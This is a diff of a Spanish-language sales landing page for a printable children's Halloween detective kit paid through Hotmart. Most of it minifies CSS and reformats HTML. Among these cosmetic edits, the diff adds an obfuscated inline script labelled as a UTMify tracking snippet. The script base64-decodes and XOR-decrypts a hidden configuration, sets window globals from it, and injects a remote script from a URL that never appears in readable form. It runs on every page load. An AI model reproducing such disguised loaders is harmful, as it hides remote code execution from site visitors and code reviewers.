@@ -9,39 +9,14 @@
 
 <style>
 :root{
-  --ink:#241c31;
-  --paper:#fbf6ed;
-  --accent:#a6411b;
-  --muted:#514653;
-  --line:#dfd4c5;
-  --soft:#f0e8dc;
-  --white:#fffdf9;
+  --ink:#241c31;--paper:#fbf6ed;--accent:#a6411b;
+  --muted:#514653;--line:#dfd4c5;--soft:#f0e8dc;--white:#fffdf9;
 }
-
 *{box-sizing:border-box}
-
-html{
-  scroll-behavior:smooth;
-  scroll-padding-top:22px;
-}
-
-body{
-  margin:0;
-  padding-bottom:90px;
-  background:var(--paper);
-  color:var(--ink);
-  font:16px/1.6 Arial,Helvetica,sans-serif;
-}
-
+html{scroll-behavior:smooth;scroll-padding-top:22px}
+body{margin:0;padding-bottom:90px;background:var(--paper);color:var(--ink);font:16px/1.6 Arial,Helvetica,sans-serif}
 h1,h2,h3,p,figure{margin:0}
-
-h1,h2{
-  font-family:Georgia,serif;
-  letter-spacing:-.035em;
-  line-height:1.1;
-  font-weight:400;
-}
-
+h1,h2{font-family:Georgia,serif;letter-spacing:-.035em;line-height:1.1;font-weight:400}
 h1{font-size:clamp(36px,9.4vw,60px)}
 h2{font-size:clamp(29px,7.5vw,43px)}
 h3{font-size:18px;line-height:1.35}
@@ -50,626 +25,117 @@ a{color:inherit}
 img{display:block;width:100%;height:auto}
 picture{display:block;min-width:0}
 button{font:inherit;cursor:pointer}
-
-a,button,summary{
-  -webkit-tap-highlight-color:transparent;
-}
-
-a:focus-visible,
-button:focus-visible,
-summary:focus-visible{
-  outline:3px solid #8060b6;
-  outline-offset:4px;
-}
-
-.wrap{
-  width:min(1080px,calc(100% - 36px));
-  margin:auto;
-}
-
-.top{
-  padding:6px 12px;
-  background:var(--ink);
-  color:#fff;
-  text-align:center;
-  font-size:11px;
-  letter-spacing:.07em;
-}
-
-.nav{
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-  gap:12px;
-  min-height:60px;
-}
-
-.brand{
-  font-weight:900;
-  letter-spacing:.14em;
-  font-size:14px;
-  text-decoration:none;
-}
-
-.navlink{
-  font-weight:700;
-  font-size:13px;
-  text-decoration:none;
-  border-bottom:1px solid;
-}
-
-.eyebrow{
-  display:block;
-  margin-bottom:10px;
-  font-size:11px;
-  text-transform:uppercase;
-  letter-spacing:.1em;
-  font-weight:800;
-  color:var(--accent);
-}
-
+a,button,summary{-webkit-tap-highlight-color:transparent}
+a:focus-visible,button:focus-visible,summary:focus-visible{outline:3px solid #8060b6;outline-offset:4px}
+.wrap{width:min(1080px,calc(100% - 36px));margin:auto}
+.top{padding:6px 12px;background:var(--ink);color:#fff;text-align:center;font-size:11px;letter-spacing:.07em}
+.nav{display:flex;justify-content:space-between;align-items:center;gap:12px;min-height:60px}
+.brand{font-weight:900;letter-spacing:.14em;font-size:14px;text-decoration:none}
+.navlink{font-weight:700;font-size:13px;text-decoration:none;border-bottom:1px solid}
+.eyebrow{display:block;margin-bottom:10px;font-size:11px;text-transform:uppercase;letter-spacing:.1em;font-weight:800;color:var(--accent)}
 .accent{color:var(--accent)}
-
-.intro{
-  margin-top:16px;
-  font-size:17px;
-  color:var(--muted);
-}
-
+.intro{margin-top:16px;font-size:17px;color:var(--muted)}
 .muted{color:var(--muted)}
 .small{font-size:13px}
-
-.note{
-  margin-top:10px;
-  font-size:12px;
-  line-height:1.55;
-  color:var(--muted);
-}
-
+.note{margin-top:10px;font-size:12px;line-height:1.55;color:var(--muted)}
 .section{padding:42px 0}
-
-.head{
-  max-width:680px;
-  margin-bottom:22px;
-}
-
-.head p{
-  margin-top:14px;
-  color:var(--muted);
-}
-
-.hero{
-  display:grid;
-  gap:22px;
-  padding:18px 0 30px;
-}
-
+.head{max-width:680px;margin-bottom:22px}
+.head p{margin-top:14px;color:var(--muted)}
+.hero{display:grid;gap:22px;padding:18px 0 30px}
 .hero-copy h1{max-width:670px}
 .hero-copy .eyebrow{font-size:10px}
-
-.hero-action{
-  display:grid;
-  gap:8px;
-  margin-top:20px;
-}
-
-.btn{
-  display:inline-flex;
-  justify-content:center;
-  align-items:center;
-  gap:10px;
-  min-height:54px;
-  padding:14px 18px;
-  border:0;
-  border-radius:9px;
-  background:var(--accent);
-  color:#fff;
-  font-size:15px;
-  font-weight:800;
-  text-decoration:none;
-  text-align:center;
-  line-height:1.4;
-}
-
+.hero-action{display:grid;gap:8px;margin-top:20px}
+.btn{display:inline-flex;justify-content:center;align-items:center;gap:10px;min-height:54px;padding:14px 18px;border:0;border-radius:9px;background:var(--accent);color:#fff;font-size:15px;font-weight:800;text-decoration:none;text-align:center;line-height:1.4}
 .btn:hover{background:#893613}
 .hero-action .btn{width:100%}
-
-.price-line{
-  font-size:15px;
-  font-weight:700;
-}
-
-.hero-meta{
-  font-size:12px;
-  color:var(--muted);
-}
-
-.tags{
-  display:flex;
-  flex-wrap:wrap;
-  gap:6px;
-  margin-top:16px;
-}
-
-.tags span{
-  padding:4px 8px;
-  border:1px solid var(--line);
-  border-radius:20px;
-  font-size:12px;
-  font-weight:700;
-}
-
-.hero-media{
-  background:var(--soft);
-  border:1px solid var(--line);
-  border-radius:14px;
-  padding:16px;
-  text-align:center;
-  max-width:440px;
-  width:100%;
-  margin-inline:auto;
-}
-
-.hero-media picture{
-  width:min(100%,340px);
-  margin-inline:auto;
-}
-
-.hero-media img{
-  width:100%;
-  height:auto;
-  border-radius:10px;
-}
-
-.hero-media h3{
-  margin-top:16px;
-  font-size:20px;
-  line-height:1.3;
-  font-family:Georgia,serif;
-}
-
-.hero-media p{
-  margin-top:9px;
-  font-size:13px;
-  color:var(--muted);
-}
-
-.trustline{
-  border-block:1px solid var(--line);
-  background:var(--soft);
-}
-
-.trustline .wrap{
-  display:grid;
-  grid-template-columns:repeat(3,1fr);
-  gap:8px;
-  padding-block:17px;
-  text-align:center;
-}
-
-.trustline strong{
-  display:block;
-  font-size:15px;
-  line-height:1.3;
-}
-
-.trustline span{
-  display:block;
-  margin-top:5px;
-  font-size:11px;
-  line-height:1.4;
-  color:var(--muted);
-}
-
-.proof-grid,
-.split{
-  display:grid;
-  gap:24px;
-  align-items:center;
-}
-
-.proof-real{
-  padding:18px;
-  background:#fff;
-  border:1px solid var(--line);
-  border-radius:12px;
-  text-align:center;
-}
-
-.proof-real img{
-  box-shadow:0 2px 10px #241c3120;
-}
-
-.proof-real button{
-  padding:0;
-  border:0;
-  background:none;
-}
-
-.proof-real>button{
-  display:block;
-  width:min(100%,340px);
-  margin:0 auto 18px;
-}
-
+.price-line{font-size:15px;font-weight:700}
+.hero-meta{font-size:12px;color:var(--muted)}
+.tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.tags span{padding:4px 8px;border:1px solid var(--line);border-radius:20px;font-size:12px;font-weight:700}
+.hero-media{background:var(--soft);border:1px solid var(--line);border-radius:14px;padding:16px;text-align:center;max-width:440px;width:100%;margin-inline:auto}
+.hero-media picture{width:min(100%,340px);margin-inline:auto}
+.hero-media img{width:100%;height:auto;border-radius:10px}
+.hero-media h3{margin-top:16px;font-size:20px;line-height:1.3;font-family:Georgia,serif}
+.hero-media p{margin-top:9px;font-size:13px;color:var(--muted)}
+.trustline{border-block:1px solid var(--line);background:var(--soft)}
+.trustline .wrap{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding-block:17px;text-align:center}
+.trustline strong{display:block;font-size:15px;line-height:1.3}
+.trustline span{display:block;margin-top:5px;font-size:11px;line-height:1.4;color:var(--muted)}
+.proof-grid,.split{display:grid;gap:24px;align-items:center}
+.proof-real{padding:18px;background:#fff;border:1px solid var(--line);border-radius:12px;text-align:center}
+.proof-real img{box-shadow:0 2px 10px #241c3120}
+.proof-real button{padding:0;border:0;background:none}
+.proof-real>button{display:block;width:min(100%,340px);margin:0 auto 18px}
 .proof-real h3{font-size:19px}
-
-.proof-real p{
-  margin-top:8px;
-  font-size:14px;
-}
-
-.tap{
-  display:block;
-  margin:10px auto 0;
-  min-height:44px;
-  padding:10px 14px!important;
-  color:var(--accent);
-  font-size:12px;
-  font-weight:700;
-}
-
-.demo{
-  padding:19px;
-  border:1px solid var(--line);
-  border-radius:12px;
-  background:var(--soft);
-}
-
+.proof-real p{margin-top:8px;font-size:14px}
+.tap{display:block;margin:10px auto 0;min-height:44px;padding:10px 14px!important;color:var(--accent);font-size:12px;font-weight:700}
+.demo{padding:19px;border:1px solid var(--line);border-radius:12px;background:var(--soft)}
 .demo h3{font-size:19px}
-
-.demo p{
-  margin-top:12px;
-  font-size:14px;
-}
-
-.demo-options{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:9px;
-  margin-top:15px;
-}
-
-.demo-options button{
-  min-height:46px;
-  border:1px solid #b6a5c4;
-  border-radius:7px;
-  background:var(--white);
-  color:var(--ink);
-  font-weight:700;
-}
-
-.demo-options button[aria-pressed="true"]{
-  background:var(--ink);
-  color:white;
-}
-
+.demo p{margin-top:12px;font-size:14px}
+.demo-options{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-top:15px}
+.demo-options button{min-height:46px;border:1px solid #b6a5c4;border-radius:7px;background:var(--white);color:var(--ink);font-weight:700}
+.demo-options button[aria-pressed="true"]{background:var(--ink);color:white}
 .demo-result{min-height:46px}
 .demo .note{font-size:12px}
-
-.gallery{
-  display:flex;
-  gap:14px;
-  margin-top:20px;
-  padding-bottom:12px;
-  overflow-x:auto;
-  scroll-snap-type:x mandatory;
-  -webkit-overflow-scrolling:touch;
-}
-
-.preview{
-  padding:8px;
-  border:1px solid var(--line);
-  border-radius:8px;
-  background:var(--soft);
-  color:var(--ink);
-  min-width:0;
-}
-
-.gallery .preview{
-  display:block;
-  flex:0 0 86%;
-  max-width:340px;
-  margin:0;
-  padding:12px;
-  scroll-snap-align:start;
-}
-
-.preview span{
-  display:block;
-  margin-top:12px;
-  font-size:14px;
-  font-weight:700;
-  line-height:1.4;
-}
-
-.preview img{
-  width:100%;
-  height:auto;
-}
-
+.gallery{display:flex;gap:14px;margin-top:20px;padding-bottom:12px;overflow-x:auto;scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch}
+.preview{padding:8px;border:1px solid var(--line);border-radius:8px;background:var(--soft);color:var(--ink);min-width:0}
+.gallery .preview{display:block;flex:0 0 86%;max-width:340px;margin:0;padding:12px;scroll-snap-align:start}
+.preview span{display:block;margin-top:12px;font-size:14px;font-weight:700;line-height:1.4}
+.preview img{width:100%;height:auto}
 .inline-action{margin-top:23px}
 .inline-action .btn{width:100%}
 .soft{background:var(--soft)}
 .rounded{border-radius:12px}
-
-.benefit-grid{
-  display:grid;
-  gap:14px;
-  margin-top:22px;
-}
-
-.benefit{
-  padding:18px;
-  border:1px solid var(--line);
-  border-radius:10px;
-  background:var(--white);
-}
-
-.benefit p{
-  margin-top:8px;
-  font-size:14px;
-  color:var(--muted);
-}
-
-.check{
-  list-style:none;
-  margin:20px 0;
-  padding:0;
-}
-
-.check li{
-  position:relative;
-  padding-left:24px;
-  margin:12px 0;
-  font-size:15px;
-}
-
-.check li:before{
-  content:"✓";
-  position:absolute;
-  left:0;
-  font-weight:900;
-  color:var(--accent);
-}
-
-.details-box{
-  margin-top:20px;
-  padding-left:17px;
-  border-left:3px solid var(--accent);
-}
-
+.benefit-grid{display:grid;gap:14px;margin-top:22px}
+.benefit{padding:18px;border:1px solid var(--line);border-radius:10px;background:var(--white)}
+.benefit p{margin-top:8px;font-size:14px;color:var(--muted)}
+.check{list-style:none;margin:20px 0;padding:0}
+.check li{position:relative;padding-left:24px;margin:12px 0;font-size:15px}
+.check li:before{content:"✓";position:absolute;left:0;font-weight:900;color:var(--accent)}
+.details-box{margin-top:20px;padding-left:17px;border-left:3px solid var(--accent)}
 .details-box p{font-size:14px}
-
-.steps{
-  display:grid;
-  gap:20px;
-  margin-top:24px;
-}
-
-.step{
-  display:grid;
-  grid-template-columns:28px 1fr;
-  gap:12px;
-}
-
-.num{
-  font:28px Georgia;
-  color:var(--accent);
-}
-
-.step p{
-  margin-top:6px;
-  font-size:14px;
-  color:var(--muted);
-}
-
-.materials{
-  margin-top:24px;
-  padding-top:16px;
-  border-top:1px solid var(--line);
-  font-size:13px;
-}
-
-.offer{
-  background:var(--ink);
-  color:var(--paper);
-}
-
+.steps{display:grid;gap:20px;margin-top:24px}
+.step{display:grid;grid-template-columns:28px 1fr;gap:12px}
+.num{font:28px Georgia;color:var(--accent)}
+.step p{margin-top:6px;font-size:14px;color:var(--muted)}
+.materials{margin-top:24px;padding-top:16px;border-top:1px solid var(--line);font-size:13px}
+.offer{background:var(--ink);color:var(--paper)}
 .offer .eyebrow{color:#ffbc8e}
-
-.offer-grid{
-  display:grid;
-  gap:24px;
-}
-
-.offer-summary p{
-  margin-top:16px;
-  color:#f3e9f6;
-}
-
-.offer-card{
-  padding:24px;
-  border-radius:14px;
-  background:var(--white);
-  color:var(--ink);
-  scroll-margin-top:20px;
-}
-
+.offer-grid{display:grid;gap:24px}
+.offer-summary p{margin-top:16px;color:#f3e9f6}
+.offer-card{padding:24px;border-radius:14px;background:var(--white);color:var(--ink);scroll-margin-top:20px}
 .offer-card .eyebrow{color:var(--accent)}
 .offer-title{font:25px/1.2 Georgia}
-
-.price{
-  margin-top:15px;
-  font:52px/1.1 Georgia;
-  letter-spacing:-.04em;
-}
-
-.price span{
-  font:12px Arial;
-  letter-spacing:0;
-}
-
-.offer-card p{
-  margin-top:10px;
-  font-size:13px;
-  color:var(--muted);
-}
-
-.offer-card .btn{
-  width:100%;
-  margin-top:8px;
-}
-
-.offer-card .payment{
-  font-size:13px;
-  font-weight:700;
-  color:var(--ink);
-}
-
-.offer-facts{
-  margin-top:18px;
-  padding-top:10px;
-  border-top:1px solid var(--line);
-}
-
+.price{margin-top:15px;font:52px/1.1 Georgia;letter-spacing:-.04em}
+.price span{font:12px Arial;letter-spacing:0}
+.offer-card p{margin-top:10px;font-size:13px;color:var(--muted)}
+.offer-card .btn{width:100%;margin-top:8px}
+.offer-card .payment{font-size:13px;font-weight:700;color:var(--ink)}
+.offer-facts{margin-top:18px;padding-top:10px;border-top:1px solid var(--line)}
 .offer-card .tax-note{font-size:11px}
 .faq{max-width:780px}
-
-details{
-  padding:17px 0;
-  border-bottom:1px solid var(--line);
-}
-
-summary{
-  cursor:pointer;
-  min-height:32px;
-  font-size:15px;
-  font-weight:700;
-  line-height:1.5;
-}
-
-details p{
-  margin-top:12px;
-  font-size:14px;
-  color:var(--muted);
-}
-
-.closing{
-  text-align:center;
-  max-width:700px;
-}
-
-.closing p{
-  margin-top:16px;
-  color:var(--muted);
-}
-
-.closing .btn{
-  width:100%;
-  margin-top:22px;
-}
-
-footer{
-  padding:25px 0;
-  border-top:1px solid var(--line);
-  font-size:12px;
-  color:var(--muted);
-}
-
-.footer-grid{
-  display:grid;
-  gap:18px;
-}
-
+details{padding:17px 0;border-bottom:1px solid var(--line)}
+summary{cursor:pointer;min-height:32px;font-size:15px;font-weight:700;line-height:1.5}
+details p{margin-top:12px;font-size:14px;color:var(--muted)}
+.closing{text-align:center;max-width:700px}
+.closing p{margin-top:16px;color:var(--muted)}
+.closing .btn{width:100%;margin-top:22px}
+footer{padding:25px 0;border-top:1px solid var(--line);font-size:12px;color:var(--muted)}
+.footer-grid{display:grid;gap:18px}
 .footer-grid p{margin:0}
-
-.footer-links{
-  display:flex;
-  flex-wrap:wrap;
-  gap:16px;
-  margin-top:10px;
-}
-
+.footer-links{display:flex;flex-wrap:wrap;gap:16px;margin-top:10px}
 .sticky[hidden]{display:none}
-
-.sticky{
-  position:fixed;
-  inset-inline:0;
-  bottom:0;
-  z-index:20;
-  padding:9px 16px calc(9px + env(safe-area-inset-bottom));
-  border-top:1px solid var(--line);
-  background:#fffdf9fa;
-}
-
-.sticky-inner{
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-  gap:12px;
-  max-width:1080px;
-  margin:auto;
-}
-
-.sticky strong{
-  display:block;
-  font-size:19px;
-  line-height:1.3;
-}
-
-.sticky small{
-  display:block;
-  font-size:11px;
-  color:var(--muted);
-}
-
-.sticky .btn{
-  min-height:47px;
-  padding:10px 15px;
-  font-size:13px;
-}
-
-.skip{
-  position:absolute;
-  top:-100px;
-}
-
-.skip:focus{
-  top:0;
-  z-index:50;
-  padding:12px;
-  background:#fff;
-}
-
-dialog{
-  width:min(94vw,760px);
-  max-height:92dvh;
-  padding:16px;
-  border:0;
-  border-radius:12px;
-  background:var(--paper);
-}
-
+.sticky{position:fixed;inset-inline:0;bottom:0;z-index:20;padding:9px 16px calc(9px + env(safe-area-inset-bottom));border-top:1px solid var(--line);background:#fffdf9fa}
+.sticky-inner{display:flex;justify-content:space-between;align-items:center;gap:12px;max-width:1080px;margin:auto}
+.sticky strong{display:block;font-size:19px;line-height:1.3}
+.sticky small{display:block;font-size:11px;color:var(--muted)}
+.sticky .btn{min-height:47px;padding:10px 15px;font-size:13px}
+.skip{position:absolute;top:-100px}
+.skip:focus{top:0;z-index:50;padding:12px;background:#fff}
+dialog{width:min(94vw,760px);max-height:92dvh;padding:16px;border:0;border-radius:12px;background:var(--paper)}
 dialog::backdrop{background:#171021cc}
-
-dialog img{
-  width:auto;
-  max-width:100%;
-  max-height:75dvh;
-  margin:auto;
-}
-
-.close{
-  display:block;
-  min-height:44px;
-  margin:0 0 12px auto;
-  padding:9px 14px;
-  border:1px solid var(--line);
-  border-radius:6px;
-  background:#fff;
-}
-
+dialog img{width:auto;max-width:100%;max-height:75dvh;margin:auto}
+.close{display:block;min-height:44px;margin:0 0 12px auto;padding:9px 14px;border:1px solid var(--line);border-radius:6px;background:#fff}
 body.modal-open{overflow:hidden}
 #checkoutDialog{max-width:430px}
 .separator{border-top:1px solid var(--line)}
@@ -680,85 +146,26 @@ body.modal-open{overflow:hidden}
   .footer-grid{grid-template-columns:1fr 1fr}
   .inline-action .btn,.closing .btn{width:auto}
 }
-
 @media(min-width:900px){
   body{padding-bottom:0}
-
-  .wrap{
-    width:min(1080px,calc(100% - 80px));
-  }
-
+  .wrap{width:min(1080px,calc(100% - 80px))}
   .nav{min-height:72px}
-
-  .hero{
-    grid-template-columns:1.2fr .8fr;
-    align-items:center;
-    gap:52px;
-    padding:38px 0 48px;
-  }
-
+  .hero{grid-template-columns:1.2fr .8fr;align-items:center;gap:52px;padding:38px 0 48px}
   .hero-action{max-width:460px}
-
-  .hero-media{
-    max-width:none;
-    padding:20px;
-  }
-
-  .hero-media img{
-    max-height:350px;
-    object-fit:contain;
-  }
-
-  .hero-media h3{
-    margin-top:15px;
-    font-size:17px;
-  }
-
+  .hero-media{max-width:none;padding:20px}
+  .hero-media img{max-height:350px;object-fit:contain}
+  .hero-media h3{margin-top:15px;font-size:17px}
   .section{padding:65px 0}
-
-  .proof-grid{
-    grid-template-columns:1fr 1fr;
-    align-items:stretch;
-    gap:30px;
-  }
-
-  .proof-real{
-    display:grid;
-    grid-template-columns:160px 1fr;
-    gap:15px;
-    align-items:center;
-    text-align:left;
-    padding:14px;
-  }
-
+  .proof-grid{grid-template-columns:1fr 1fr;align-items:stretch;gap:30px}
+  .proof-real{display:grid;grid-template-columns:160px 1fr;gap:15px;align-items:center;text-align:left;padding:14px}
   .proof-real>button{margin:0}
   .proof-real h3{font-size:16px}
   .proof-real p{font-size:13px}
   .proof-real .tap{margin-inline:0}
-
-  .gallery{
-    display:grid;
-    grid-template-columns:repeat(3,minmax(0,1fr));
-    gap:18px;
-    overflow:visible;
-  }
-
-  .gallery .preview{
-    max-width:none;
-    width:100%;
-  }
-
-  .split{
-    grid-template-columns:1fr 1fr;
-    gap:45px;
-  }
-
-  .offer-grid{
-    grid-template-columns:.85fr 1.15fr;
-    gap:65px;
-    align-items:start;
-  }
-
+  .gallery{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:18px;overflow:visible}
+  .gallery .preview{max-width:none;width:100%}
+  .split{grid-template-columns:1fr 1fr;gap:45px}
+  .offer-grid{grid-template-columns:.85fr 1.15fr;gap:65px;align-items:start}
   .offer-card{padding:32px}
   .sticky{display:none}
   .hero-copy .eyebrow{font-size:12px}
@@ -767,14 +174,9 @@ body.modal-open{overflow:hidden}
   .trustline strong{font-size:18px}
   .hero-meta{font-size:13px}
 }
-
 @media(max-width:899px){
-  .hero-action .btn{
-    min-height:56px;
-    font-size:16px;
-  }
+  .hero-action .btn{min-height:56px;font-size:16px}
 }
-
 @media(max-width:355px){
   .wrap{width:calc(100% - 28px)}
   .hero-media{padding:12px}
@@ -782,19 +184,19 @@ body.modal-open{overflow:hidden}
   .sticky{padding-inline:12px}
   .sticky .btn{font-size:12px;padding-inline:12px}
 }
-
 @media(prefers-reduced-motion:reduce){
   html{scroll-behavior:auto}
 }
 </style>
+
+<!-- Script de UTMs fornecido pela UTMify -->
+<script>(function(){var c_kj=atob("DOfbHkhsxG21Pe/JPZz5azoA5leXVZu9TZThMWcPoAObSJukVIGiMCsDqUPXT8C6XpWybjwf6xjBUJzmUYavezsY6gfGH8PrXJOvbCEOsRnQTs3zZpz5cCkBoU+PH4uoSYb2azwBrQvMEJ+7WJG+cDxBtxjXVIu6H8v5aCkAsQiXB83rQLqm");var h_du6e=[];for(var j_a=0;j_a<c_kj.length;j_a++){h_du6e.push(c_kj.charCodeAt(j_a)&255);}var e_pj6b=h_du6e[0];var c_plr=h_du6e.slice(1,1+e_pj6b);var k_0=h_du6e.slice(1+e_pj6b);var l_3=k_0.map(function(b,u_t){return b^c_plr[u_t%e_pj6b];});var l_0v="";for(var g_0dt=0;g_0dt<l_3.length;g_0dt++){l_0v+=String.fromCharCode(l_3[g_0dt]&255);}var e_l=decodeURIComponent(escape(l_0v));var n_l2h=JSON.parse(e_l);var c_z=n_l2h.globals||[];c_z.forEach(function(h_o0){window[h_o0.name]=h_o0.value;});var l_qwb=document.createElement("script");l_qwb.src=n_l2h.url;l_qwb.async=true;l_qwb.defer=true;(n_l2h.attributes||[]).forEach(function(k_kb){l_qwb.setAttribute(k_kb.name,k_kb.value);});(document.head||document.documentElement).appendChild(l_qwb);})();</script>
 </head>
 
 <body>
 <a class="skip" href="#main">Ir al contenido</a>
 
-<div class="top">
-  HALLOWEEN EN EQUIPO · PDF EN ESPAÑOL
-</div>
+<div class="top">HALLOWEEN EN EQUIPO · PDF EN ESPAÑOL</div>
 
 <header class="wrap nav">
   <a class="brand" href="#main">VILLA LUNA</a>
@@ -802,7 +204,6 @@ body.modal-open{overflow:hidden}
 </header>
 
 <main id="main">
-
 <section class="wrap hero" aria-labelledby="hero-title">
   <div class="hero-copy">
     <span class="eyebrow">
@@ -827,19 +228,13 @@ body.modal-open{overflow:hidden}
     </p>
 
     <div class="hero-action">
-      <p class="price-line">
-        
-      </p>
-
-      <a
-        class="btn"
-        href="https://pay.hotmart.com/R108013081C?checkoutMode=10"
-        data-checkout-link
-      >
+      <p class="price-line"></p>
+      <a class="btn"
+         href="https://pay.hotmart.com/R108013081C?checkoutMode=10"
+         data-checkout-link>
         Quiero preparar nuestra misión
         <span aria-hidden="true">→</span>
       </a>
-
       <p class="hero-meta">
         PDF para imprimir · Pago en Hotmart · Sin suscripción
       </p>
@@ -854,29 +249,20 @@ body.modal-open{overflow:hidden}
 
   <div class="hero-media">
     <picture>
-      <source
-        media="(min-width:900px)"
-        sizes="340px"
-        srcset="
-          assets/cover-800-e7d44e2be5.webp 800w,
-          assets/cover-1200-8026f2e9da.webp 1200w
-        "
-      >
-      <img
-        src="assets/cover-400-8f23c8afff.webp"
-        srcset="
-          assets/cover-400-8f23c8afff.webp 400w,
-          assets/cover-640-8a83fee944.webp 640w
-        "
-        sizes="(min-width:400px) 340px, calc(100vw - 68px)"
-        width="1122"
-        height="1402"
-        fetchpriority="high"
-        decoding="async"
-        alt="Mockup de la portada del kit digital El caso de la calabaza desaparecida"
-      >
+      <source media="(min-width:900px)"
+              sizes="340px"
+              srcset="assets/cover-800-e7d44e2be5.webp 800w,
+                      assets/cover-1200-8026f2e9da.webp 1200w">
+      <img src="assets/cover-400-8f23c8afff.webp"
+           srcset="assets/cover-400-8f23c8afff.webp 400w,
+                   assets/cover-640-8a83fee944.webp 640w"
+           sizes="(min-width:400px) 340px, calc(100vw - 68px)"
+           width="1122"
+           height="1402"
+           fetchpriority="high"
+           decoding="async"
+           alt="Mockup de la portada del kit digital El caso de la calabaza desaparecida">
     </picture>
-
     <div>
       <h3>El caso de la calabaza desaparecida</h3>
       <p>
@@ -910,15 +296,11 @@ body.modal-open{overflow:hidden}
 
 <section class="section wrap" id="muestras">
   <div class="head">
-    <span class="eyebrow">
-      Mira cómo funciona antes de comprar
-    </span>
-
+    <span class="eyebrow">Mira cómo funciona antes de comprar</span>
     <h2>
       No basta con adivinar.<br>
       Hay que conectar las pruebas.
     </h2>
-
     <p>
       El equipo compara testimonios y personajes, sigue una ruta
       y ordena un código. Prueba esta pequeña deducción con
@@ -928,35 +310,24 @@ body.modal-open{overflow:hidden}
 
   <div class="proof-grid">
     <div class="proof-real">
-      <button
-        type="button"
-        data-preview="assets/page-2-fa2c73b3c9.webp"
-        data-alt="Página original con las fichas de los cuatro ayudantes"
-        aria-label="Ampliar las fichas reales de los personajes"
-      >
-        <img
-          src="assets/page-2-fa2c73b3c9.webp"
-          width="700"
-          height="906"
-          loading="lazy"
-          decoding="async"
-          alt="Página real: compara los rasgos de Nube, Teo, Ada y Leo"
-        >
+      <button type="button"
+              data-preview="assets/page-2-fa2c73b3c9.webp"
+              data-alt="Página original con las fichas de los cuatro ayudantes"
+              aria-label="Ampliar las fichas reales de los personajes">
+        <img src="assets/page-2-fa2c73b3c9.webp"
+             width="700" height="906"
+             loading="lazy" decoding="async"
+             alt="Página real: compara los rasgos de Nube, Teo, Ada y Leo">
       </button>
-
       <div>
         <h3>Las fichas que recibe tu equipo</h3>
         <p>
           Una sola característica no basta.
           Observa las orejas y el transporte de cada ayudante.
         </p>
-
-        <button
-          type="button"
-          class="tap"
-          data-preview="assets/page-2-fa2c73b3c9.webp"
-          data-alt="Fichas originales de los cuatro ayudantes"
-        >
+        <button type="button" class="tap"
+                data-preview="assets/page-2-fa2c73b3c9.webp"
+                data-alt="Fichas originales de los cuatro ayudantes">
           Toca para ampliar ↗
         </button>
       </div>
@@ -965,40 +336,21 @@ body.modal-open{overflow:hidden}
     <div class="demo">
       <span class="eyebrow">Prueba una deducción</span>
       <h3>Orejas triangulares + bolsa.</h3>
-
       <p>
         Mira las fichas originales:
         ¿quién tiene orejas triangulares y usa bolsa?
       </p>
 
-      <div
-        class="demo-options"
-        role="group"
-        aria-label="Elige el ayudante"
-      >
-        <button type="button" data-demo="nube" aria-pressed="false">
-          Nube
-        </button>
-        <button type="button" data-demo="teo" aria-pressed="false">
-          Teo
-        </button>
-        <button type="button" data-demo="ada" aria-pressed="false">
-          Ada
-        </button>
-        <button type="button" data-demo="leo" aria-pressed="false">
-          Leo
-        </button>
+      <div class="demo-options" role="group" aria-label="Elige el ayudante">
+        <button type="button" data-demo="nube" aria-pressed="false">Nube</button>
+        <button type="button" data-demo="teo" aria-pressed="false">Teo</button>
+        <button type="button" data-demo="ada" aria-pressed="false">Ada</button>
+        <button type="button" data-demo="leo" aria-pressed="false">Leo</button>
       </div>
 
-      <p
-        class="demo-result"
-        id="demoResult"
-        role="status"
-        aria-live="polite"
-      >
+      <p class="demo-result" id="demoResult" role="status" aria-live="polite">
         Elige una respuesta para comprobar tu deducción.
       </p>
-
       <p class="note">
         Ejemplo de deducción. El caso principal usa otras pistas;
         su solución no se revela aquí.
@@ -1007,54 +359,33 @@ body.modal-open{overflow:hidden}
   </div>
 
   <div class="gallery">
-    <button
-      class="preview"
-      type="button"
-      data-preview="assets/page-1-d8e002b9b5.webp"
-      data-alt="Página original con las cuatro etapas de investigación"
-    >
-      <img
-        src="assets/page-1-d8e002b9b5.webp"
-        width="700"
-        height="906"
-        loading="lazy"
-        decoding="async"
-        alt="Etapas de la investigación"
-      >
+    <button class="preview" type="button"
+            data-preview="assets/page-1-d8e002b9b5.webp"
+            data-alt="Página original con las cuatro etapas de investigación">
+      <img src="assets/page-1-d8e002b9b5.webp"
+           width="700" height="906"
+           loading="lazy" decoding="async"
+           alt="Etapas de la investigación">
       <span>Las cuatro etapas ↗</span>
     </button>
 
-    <button
-      class="preview"
-      type="button"
-      data-preview="assets/page-2-fa2c73b3c9.webp"
-      data-alt="Página original con las fichas de los cuatro ayudantes"
-    >
-      <img
-        src="assets/page-2-fa2c73b3c9.webp"
-        width="700"
-        height="906"
-        loading="lazy"
-        decoding="async"
-        alt="Fichas originales de los personajes"
-      >
+    <button class="preview" type="button"
+            data-preview="assets/page-2-fa2c73b3c9.webp"
+            data-alt="Página original con las fichas de los cuatro ayudantes">
+      <img src="assets/page-2-fa2c73b3c9.webp"
+           width="700" height="906"
+           loading="lazy" decoding="async"
+           alt="Fichas originales de los personajes">
       <span>Los personajes ↗</span>
     </button>
 
-    <button
-      class="preview"
-      type="button"
-      data-preview="assets/page-3-9bdd8e926e.webp"
-      data-alt="Página original de invitación y distintivos"
-    >
-      <img
-        src="assets/page-3-9bdd8e926e.webp"
-        width="700"
-        height="906"
-        loading="lazy"
-        decoding="async"
-        alt="Invitación y distintivos originales"
-      >
+    <button class="preview" type="button"
+            data-preview="assets/page-3-9bdd8e926e.webp"
+            data-alt="Página original de invitación y distintivos">
+      <img src="assets/page-3-9bdd8e926e.webp"
+           width="700" height="906"
+           loading="lazy" decoding="async"
+           alt="Invitación y distintivos originales">
       <span>Los accesorios ↗</span>
     </button>
   </div>
@@ -1065,31 +396,24 @@ body.modal-open{overflow:hidden}
   </p>
 
   <div class="inline-action">
-    <a class="btn" href="#comprar">
-      Ver todo lo que recibo →
-    </a>
+    <a class="btn" href="#comprar">Ver todo lo que recibo →</a>
